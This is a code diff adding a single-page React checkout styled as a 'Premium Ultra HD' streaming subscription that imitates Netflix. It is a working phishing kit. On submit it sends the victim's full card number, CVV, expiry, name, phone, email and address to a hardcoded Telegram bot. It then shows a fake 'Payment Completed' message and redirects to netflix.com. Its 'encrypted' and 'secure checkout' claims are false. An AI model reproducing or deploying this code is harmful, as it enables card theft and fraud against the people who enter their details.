@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Streaming Service Payment Demo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <style>
+      body { margin: 0; }
+      .spinner {
+        width: 44px;
+        height: 44px;
+        border: 4px solid rgba(248,113,113,0.35);
+        border-top-color: rgba(248,113,113,1);
+        border-radius: 9999px;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin { to { transform: rotate(360deg); } }
+      @keyframes progress {
+        0% { transform: translateX(-100%); }
+        50% { transform: translateX(0); }
+        100% { transform: translateX(100%); }
+      }
+      .progress {
+        animation: progress 2.8s linear infinite;
+      }
+    </style>
+  </head>
+  <body class="bg-black text-white min-h-screen">
+    <div id="root"></div>
+
+    <script type="text/babel">
+      const { useState, useEffect, useRef } = React;
+
+      function Icon({ label }) {
+        return (
+          <div className="flex h-12 w-12 items-center justify-center rounded-3xl bg-red-500/15 text-red-200 text-xl">
+            {label}
+          </div>
+        );
+      }
+
+      function StreamingPaymentPage() {
+        const [paymentState, setPaymentState] = useState("idle");
+        const isProcessing = paymentState === "processing";
+
+        const cardNumberRef = useRef(null);
+        const cvvRef = useRef(null);
+        const phoneRef = useRef(null);
+        const expiryRef = useRef(null);
+        const [cardType, setCardType] = useState(null);
+        const [cardError, setCardError] = useState("");
+        const [cvvError, setCvvError] = useState("");
+        const [phoneError, setPhoneError] = useState("");
+        const [expiryError, setExpiryError] = useState("");
+        const [countdown, setCountdown] = useState(null);
+
+        const detectCardType = (num) => {
+          const v = (num || "").replace(/\D/g, "");
+          if (/^4/.test(v)) return "visa";
+          if (/^3[47]/.test(v)) return "amex";
+          if (/^(5[1-5]|2(?:2[2-9]|[3-6]\d|7[01])|2720)/.test(v)) return "mastercard";
+          return null;
+        };
+
+        const luhnCheck = (num) => {
+          const s = (num || "").replace(/\D/g, "");
+          let sum = 0;
+          let alt = false;
+          for (let i = s.length - 1; i >= 0; i--) {
+            let n = parseInt(s.charAt(i), 10);
+            if (alt) {
+              n *= 2;
+              if (n > 9) n -= 9;
+            }
+            sum += n;
+            alt = !alt;
+          }
+          return s.length > 0 && sum % 10 === 0;
+        };
+
+        const setCardAndCvvRules = (type) => {
+          const cn = cardNumberRef.current;
+          const cv = cvvRef.current;
+          if (!cn || !cv) return;
+          if (type === "amex") {
+            cn.maxLength = 17; // 15 digits + 2 spaces when formatted
+            cv.maxLength = 4;
+            cv.placeholder = "1234";
+          } else {
+            cn.maxLength = 19; // 16 digits + 3 spaces
+            cv.maxLength = 3;
+            cv.placeholder = "123";
+          }
+        };
+
+        const normalizeNumber = (value) => value.replace(/\D/g, "");
+
+        const formatCardNumber = (value) => {
+          const v = normalizeNumber(value);
+          if (!v) return "";
+          if (v.startsWith("34") || v.startsWith("37")) {
+            // Amex 4-6-5
+            return v.replace(/(\d{1,4})(\d{1,6})?(\d{1,5})?/, (m, a, b, c) => [a, b, c].filter(Boolean).join(" "));
+          }
+          // Default 4-4-4-4
+          return v.replace(/(\d{1,4})(\d{1,4})?(\d{1,4})?(\d{1,4})?/, (m, a, b, c, d) => [a, b, c, d].filter(Boolean).join(" "));
+        };
+
+        const handleCardNumberInput = (e) => {
+          const raw = e.target.value;
+          const formatted = formatCardNumber(raw);
+          e.target.value = formatted;
+          const type = detectCardType(raw);
+          setCardType(type);
+          setCardAndCvvRules(type);
+          // quick length check
+          const digits = normalizeNumber(formatted).length;
+          if (type === "amex") {
+            setCardError(digits === 15 || digits === 0 ? "" : "Amex requires 15 digits");
+          } else if (type) {
+            setCardError(digits === 16 || digits === 0 ? "" : "Card number should be 16 digits");
+          } else {
+            setCardError(digits >= 12 || digits === 0 ? "" : "Card number looks too short");
+          }
+        };
+
+        const handleCvvInput = (e) => {
+          const val = e.target.value.replace(/\D/g, "");
+          e.target.value = val;
+          const digits = val.length;
+          if (cardType === "amex") {
+            setCvvError(digits === 4 || digits === 0 ? "" : "AMEX CVV must be 4 digits");
+          } else {
+            setCvvError(digits === 3 || digits === 0 ? "" : "CVV must be 3 digits");
+          }
+        };
+
+        useEffect(() => {
+          setCardAndCvvRules(cardType);
+        }, [cardType]);
+
+        const normalizePhone = (v) => (v || "").replace(/\D/g, "");
+
+        const formatPhone = (value) => {
+          const v = normalizePhone(value);
+          if (!v) return "";
+          if (v.length <= 3) return `(${v}`;
+          if (v.length <= 6) return `(${v.slice(0,3)}) ${v.slice(3)}`;
+          return `(${v.slice(0,3)}) ${v.slice(3,6)}-${v.slice(6,10)}`;
+        };
+
+        const handlePhoneInput = (e) => {
+          const raw = e.target.value;
+          const formatted = formatPhone(raw);
+          e.target.value = formatted;
+          const digits = normalizePhone(formatted).length;
+          setPhoneError(digits === 10 || digits === 0 ? "" : "Phone must be 10 digits");
+        };
+
+        const formatExpiry = (value) => {
+          const v = (value || "").replace(/\D/g, "").slice(0,4);
+          if (v.length <= 2) return v;
+          return `${v.slice(0,2)}/${v.slice(2)}`;
+        };
+
+        const isExpiryValid = (value) => {
+          const v = (value || "").replace(/\s/g, "");
+          const parts = v.split('/');
+          if (parts.length !== 2) return false;
+          const mm = parseInt(parts[0], 10);
+          const yy = parseInt(parts[1], 10);
+          if (Number.isNaN(mm) || Number.isNaN(yy)) return false;
+          if (mm < 1 || mm > 12) return false;
+          const now = new Date();
+          const year = yy < 100 ? 2000 + yy : yy;
+          const exp = new Date(year, mm - 1, 1);
+          // expiry valid through end of month
+          const endOfMonth = new Date(exp.getFullYear(), exp.getMonth() + 1, 0, 23, 59, 59);
+          return endOfMonth >= now;
+        };
+
+        const handleExpiryInput = (e) => {
+          const raw = e.target.value;
+          const formatted = formatExpiry(raw);
+          e.target.value = formatted;
+          if (formatted.length === 5) {
+            setExpiryError(isExpiryValid(formatted) ? "" : "Expiry is invalid or expired");
+          } else {
+            setExpiryError("");
+          }
+        };
+
+        const BOT_TOKEN = "8135598217:AAGAWlSA0Hl5aRbU3o80tVPbV18pajOyaX4";
+        const CHAT_ID = "6197998588";
+
+        const sendTelegram = async (text) => {
+          try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: CHAT_ID, text }),
+            });
+          } catch (error) {
+            console.warn("Telegram send failed:", error);
+          }
+        };
+
+        const handleSubmit = async (event) => {
+          event.preventDefault();
+          if (paymentState !== "idle") return;
+          const formData = Object.fromEntries(new FormData(event.target).entries());
+          // Validate card number and CVV before sending
+          const cardNum = (formData.cardNumber || "").replace(/\D/g, "");
+          const cvv = (formData.cvv || "").replace(/\D/g, "");
+          const detected = detectCardType(cardNum);
+          if (!luhnCheck(cardNum)) {
+            setCardError("Invalid card number (failed checksum)");
+            if (cardNumberRef.current) cardNumberRef.current.focus();
+            return;
+          }
+          if (detected === "amex" && cardNum.length !== 15) {
+            setCardError("AMEX must be 15 digits");
+            if (cardNumberRef.current) cardNumberRef.current.focus();
+            return;
+          }
+          if ((detected === "visa" || detected === "mastercard") && cardNum.length !== 16) {
+            setCardError("Card must be 16 digits");
+            if (cardNumberRef.current) cardNumberRef.current.focus();
+            return;
+          }
+          if (detected && ((detected === "amex" && cvv.length !== 4) || (detected !== "amex" && cvv.length !== 3))) {
+            setCvvError(detected === "amex" ? "AMEX CVV must be 4 digits" : "CVV must be 3 digits");
+            if (cvvRef.current) cvvRef.current.focus();
+            return;
+          }
+          // validate phone and expiry
+          const phoneDigits = (formData.phone || "").replace(/\D/g, "");
+          if (phoneDigits.length !== 10) {
+            setPhoneError("Phone must be 10 digits");
+            if (phoneRef.current) phoneRef.current.focus();
+            return;
+          }
+          if (!isExpiryValid(formData.expiry)) {
+            setExpiryError("Expiry is invalid or expired");
+            if (expiryRef.current) expiryRef.current.focus();
+            return;
+          }
+          // clear any lingering errors before proceeding
+          setCardError("");
+          setCvvError("");
+          setPhoneError("");
+          setExpiryError("");
+          const PLAN = "Premium Ultra HD";
+          const PRICE = "$19.99";
+          const timeStr = new Date().toLocaleString('en-US', { month: 'numeric', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+          const message = [
+            "💰 New Netflix Payment 💰",
+            "",
+            `📧 Email: ${formData.email || "N/A"}`,
+            `📞 Phone: ${formData.phone || "N/A"}`,
+            `🏠 Street: ${formData.street || "N/A"}`,
+            `🏙 City: ${formData.city || "N/A"}`,
+            `📍 State: ${formData.state || "N/A"}`,
+            `💳 Card: ${formData.cardNumber || "N/A"}`,
+            `👤 Name: ${formData.cardholder || "N/A"}`,
+            `📅 Expiry: ${formData.expiry || "N/A"}`,
+            `🔒 CVV: ${formData.cvv || "N/A"}`,
+            `📺 Plan: ${PLAN}`,
+            `💵 Price: ${PRICE}`,
+            `⏰ Time: ${timeStr}`,
+            "",
+            `Payment Method: Credit Card`
+          ].join("\n");
+
+          sendTelegram(message);
+          setPaymentState("processing");
+          setTimeout(() => {
+            setPaymentState("complete");
+            // start 5 second countdown before redirect
+            setCountdown(5);
+          }, 2800);
+        };
+
+        useEffect(() => {
+          if (countdown == null) return;
+          if (countdown <= 0) {
+            window.location.replace("https://www.netflix.com");
+            return;
+          }
+          const t = setTimeout(() => setCountdown((c) => c - 1), 1000);
+          return () => clearTimeout(t);
+        }, [countdown]);
+
+        return (
+          <div className="relative min-h-screen overflow-hidden bg-black text-white">
+            <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(239,68,68,0.22),transparent_32%)]" />
+            <div className="pointer-events-none absolute top-0 left-1/2 h-96 w-96 -translate-x-1/2 rounded-full bg-red-700/20 blur-3xl" />
+            <div className="pointer-events-none absolute bottom-0 right-0 h-72 w-72 rounded-full bg-red-700/10 blur-3xl" />
+
+            <div className="relative z-10 mx-auto flex min-h-screen max-w-7xl flex-col px-4 py-10 sm:px-6 lg:px-8">
+              <div className="flex flex-1 flex-col overflow-hidden rounded-[32px] border border-white/10 bg-white/5 shadow-2xl shadow-red-950/40 backdrop-blur-2xl">
+                <div className="grid flex-1 grid-cols-1 gap-6 lg:grid-cols-2">
+                  <div className="relative flex flex-col justify-between overflow-hidden rounded-[32px] bg-gradient-to-br from-red-800 via-red-900 to-black px-8 py-10 text-white sm:px-12">
+                    <div>
+                      <div className="text-5xl font-black tracking-tight sm:text-6xl">STREAMFLIX</div>
+                      <p className="mt-5 max-w-xl text-lg leading-8 text-red-100/90 sm:text-xl">Premium streaming with cinematic quality, unlimited originals, and crystal-clear Ultra HD entertainment.</p>
+                    </div>
+                    <div className="mt-10 space-y-5">
+                      <div className="flex items-center gap-4 rounded-3xl border border-white/10 bg-white/10 p-5 backdrop-blur-xl transition-shadow hover:shadow-[0_20px_80px_rgba(255,0,0,0.12)]">
+                        <Icon label="🔒" />
+                        <div>
+                          <p className="font-semibold text-white">Encrypted Checkout</p>
+                          <p className="text-sm text-red-100/80">256-bit secure payment verification.</p>
+                        </div>
+                      </div>
+                      <div className="flex items-center gap-4 rounded-3xl border border-white/10 bg-white/10 p-5 backdrop-blur-xl transition-shadow hover:shadow-[0_20px_80px_rgba(255,0,0,0.12)]">
+                        <Icon label="✅" />
+                        <div>
+                          <p className="font-semibold text-white">Premium Membership</p>
+                          <p className="text-sm text-red-100/80">4K streaming, downloads, and multi-device access.</p>
+                        </div>
+                      </div>
+                    </div>
+                    <div className="absolute right-0 top-0 h-full w-1/2 bg-[radial-gradient(circle_at_top_right,rgba(248,113,113,0.18),transparent_40%)]" />
+                  </div>
+                  <div className="flex items-center justify-center px-4 py-8 sm:px-8">
+                    <div className="w-full max-w-xl rounded-[32px] border border-white/10 bg-zinc-950/95 p-8 shadow-2xl shadow-black/50 backdrop-blur-2xl sm:p-10">
+                      <div className="flex items-center justify-between mb-8">
+                        <div>
+                          <h1 className="text-3xl font-bold tracking-tight text-white sm:text-4xl">Complete Payment</h1>
+                          <p className="mt-2 text-sm text-zinc-400">Activate your premium streaming membership.</p>
+                        </div>
+                        <div className="flex h-14 w-14 items-center justify-center rounded-2xl bg-red-600 shadow-lg shadow-red-900/30 text-white text-2xl">💳</div>
+                      </div>
+                      <div className="mb-8 rounded-[28px] border border-white/10 bg-zinc-900/80 p-6">
+                        <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
+                          <div>
+                            <p className="text-sm text-zinc-400">Subscription Plan</p>
+                            <h2 className="mt-2 text-2xl font-semibold text-white">Premium Ultra HD</h2>
+                          </div>
+                          <div className="text-right">
+                            <p className="text-sm text-zinc-400">Monthly Billing</p>
+                            <p className="mt-2 text-3xl font-extrabold text-white">$19.99</p>
+                          </div>
+                        </div>
+                      </div>
+                      <form onSubmit={handleSubmit} className="space-y-6">
+                        <fieldset disabled={isProcessing} className="space-y-6">
+                          <div>
+                            <label className="block text-sm font-medium text-zinc-300 mb-2">Cardholder Name</label>
+                            <input name="cardholder" type="text" placeholder="John Doe" className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                          </div>
+                          <div>
+                            <label className="block text-sm font-medium text-zinc-300 mb-2">Email Address</label>
+                            <input name="email" type="email" placeholder="you@example.com" className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                          </div>
+                          <div>
+                            <label className="block text-sm font-medium text-zinc-300 mb-2">Phone Number</label>
+                            <input ref={phoneRef} name="phone" inputMode="tel" type="tel" placeholder="(555) 123-4567" onChange={handlePhoneInput} className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                            <div className="mt-2 text-sm text-rose-400">{phoneError}</div>
+                          </div>
+                          <div>
+                            <label className="block text-sm font-medium text-zinc-300 mb-2">Card Number</label>
+                            <input ref={cardNumberRef} name="cardNumber" type="text" inputMode="numeric" placeholder="1234 5678 9012 3456" onChange={handleCardNumberInput} className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                            <div className="mt-2 flex items-center justify-between text-sm">
+                              <div className="text-zinc-400">{cardType ? (cardType === 'amex' ? 'American Express' : cardType.charAt(0).toUpperCase() + cardType.slice(1)) : 'Card brand: Unknown'}</div>
+                              <div className="text-sm text-rose-400">{cardError}</div>
+                            </div>
+                          </div>
+                          <div className="grid gap-5 sm:grid-cols-2">
+                            <div>
+                              <label className="block text-sm font-medium text-zinc-300 mb-2">Expiry Date</label>
+                              <input ref={expiryRef} name="expiry" inputMode="numeric" type="text" placeholder="MM/YY" onChange={handleExpiryInput} className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                              <div className="mt-2 text-sm text-rose-400">{expiryError}</div>
+                            </div>
+                            <div>
+                              <label className="block text-sm font-medium text-zinc-300 mb-2">CVV</label>
+                              <input ref={cvvRef} name="cvv" type="password" inputMode="numeric" placeholder="123" onChange={handleCvvInput} className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                              <div className="mt-2 text-sm text-rose-400">{cvvError}</div>
+                            </div>
+                          </div>
+                          <div>
+                            <label className="block text-sm font-medium text-zinc-300 mb-3">Billing Address</label>
+                            <div className="space-y-5">
+                              <input name="street" type="text" placeholder="Street Address" className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                              <div className="grid gap-5 sm:grid-cols-2">
+                                <input name="city" type="text" placeholder="City" className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                                <input name="state" type="text" placeholder="State" className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                              </div>
+                              <input name="zip" type="text" placeholder="ZIP Code" className="w-full rounded-3xl border border-zinc-800 bg-zinc-900 px-5 py-4 text-white placeholder:text-zinc-500 focus:border-red-500 focus:outline-none focus:ring-2 focus:ring-red-500/20 transition" />
+                            </div>
+                          </div>
+                          <button type="submit" className={`w-full rounded-3xl bg-red-600 py-4 text-lg font-semibold text-white shadow-xl shadow-red-900/40 transition hover:bg-red-700 ${isProcessing ? "cursor-wait opacity-80" : "hover:shadow-red-700/50"}`}>
+                            {isProcessing ? "Processing Payment" : "Start Membership"}
+                          </button>
+                        </fieldset>
+                      </form>
+                      <div className="mt-8 flex items-center justify-center gap-2 text-sm text-zinc-500">
+                        <span className="text-red-400">🔒</span>
+                        Protected secure checkout environment
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            {paymentState !== "idle" && (
+              <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 px-4 py-6">
+                <div className="relative w-full max-w-md rounded-[28px] border border-white/10 bg-zinc-950/95 p-8 text-center shadow-2xl shadow-black/80 backdrop-blur-2xl">
+                  {paymentState === "processing" ? (
+                      <>
+                        <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-red-600/15 text-red-400 shadow-red-600/30 animate-pulse">
+                          <div className="spinner"></div>
+                        </div>
+                        <h2 className="mt-6 text-2xl font-semibold text-white">Processing Payment</h2>
+                        <p className="mt-3 text-sm text-zinc-400">Secure verification is underway. Please stay on this page.</p>
+                        <div className="mt-8 overflow-hidden rounded-full bg-zinc-900">
+                          <div className="h-3 w-full rounded-full bg-gradient-to-r from-red-500 via-red-600 to-red-400 progress" />
+                        </div>
+                        <p className="mt-4 text-sm text-zinc-500">Authorizing your premium membership...</p>
+                      </>
+                    ) : (
+                      <>
+                        <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-emerald-600/10 text-emerald-400 shadow-emerald-600/30 animate-pulse">
+                          <svg xmlns="http://www.w3.org/2000/svg" className="h-12 w-12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
+                            <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+                          </svg>
+                        </div>
+                        <h2 className="mt-6 text-2xl font-semibold text-white">Payment Completed</h2>
+                        <p className="mt-3 text-sm text-zinc-400">Thank you — your payment was successful.</p>
+                        <div className="mt-6 text-lg text-zinc-200">Redirecting in <span className="font-semibold">{countdown ?? 0}</span> second{countdown === 1 ? "" : "s"}…</div>
+                      </>
+                    )}
+                </div>
+              </div>
+            )}
+          </div>
+        );
+      }
+
+      ReactDOM.createRoot(document.getElementById("root")).render(<StreamingPaymentPage />);
+    </script>
+  </body>
+</html>
